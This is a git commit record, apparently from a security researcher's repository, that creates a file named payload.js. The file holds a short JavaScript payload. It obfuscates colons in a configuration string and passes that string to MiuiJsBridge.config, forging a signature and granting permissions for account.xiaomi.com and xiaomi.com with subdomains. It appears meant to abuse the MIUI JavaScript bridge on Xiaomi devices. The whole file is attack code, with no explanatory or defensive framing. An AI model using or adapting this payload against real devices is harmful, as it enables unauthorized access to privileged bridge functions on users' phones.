9ba4c67fa8a56feea8971053c8cc170eeb5c601c
candy maker <31258575+t4kemyh4nd@users.noreply.github.com>
2023-01-12 00:08:46 +0530

    Create payload.js

---
+++ payload.js
@@ -0,0 +1,3 @@
+var config = "{'signature'7'123456','timestamp'7123456,'vendor'7'xiaomi','content'7'test','permissions'7[{'origin'7'account.xiaomi.com','subdomains'7true},{'origin'7'xiaomi.com','subdomains'7true}]}".replaceAll('7',String.fromCharCode(58));
+
+MiuiJsBridge.config(config);
